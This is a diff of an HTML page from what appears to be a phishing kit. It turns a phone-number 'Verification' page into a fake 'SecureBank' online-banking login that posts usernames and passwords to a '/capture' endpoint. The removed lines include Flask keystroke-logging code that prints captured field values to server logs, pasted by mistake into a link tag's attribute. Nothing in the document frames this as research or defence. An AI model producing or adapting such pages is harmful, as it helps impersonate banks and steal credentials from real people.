@@ -2,34 +2,31 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
-    <link rel="@app.route('/log_keystroke', methods=['POST'])
-def log_keystroke():
-    data = request.json
-    field = data.get('field')
-    value = data.get('value')
-    
-    # We use flush=True so it prints to Render logs immediately
-    print(f"[*] KEYSTROKE LOGGED ({field}): {value}", flush=True)
-    
-    return jsonify({"status": "success"})" href="/static/style.css">
- <script src="/static/script.js"></script>
+    <title>SecureBank Login</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="/static/script.js"></script>
 </head>
 <body>
     <div class="login-container">
-        <!-- Inline SVG Placeholder Logo -->
         <svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
         </svg>
         
-        <h2>Enter your phone number</h2>
-        <p>We will need to verify your account.<br>Select a country and enter your phone number.</p>
+        <h2>Welcome to SecureBank</h2>
+        <p>Please enter your Online Banking credentials to continue securely.</p>
         
         <form action="/capture" method="POST">
             <div class="input-group">
-                <input type="text" name="phone" placeholder="Phone number (e.g., +234 801 234 5678)" required>
+                <label>Account Number or Username</label>
+                <input type="text" name="username" placeholder="Enter your Account ID" required>
             </div>
-            <button type="submit">Next</button>
+            
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your Password" required>
+            </div>
+            
+            <button type="submit">Secure Login</button>
         </form>
     </div>
 </body>
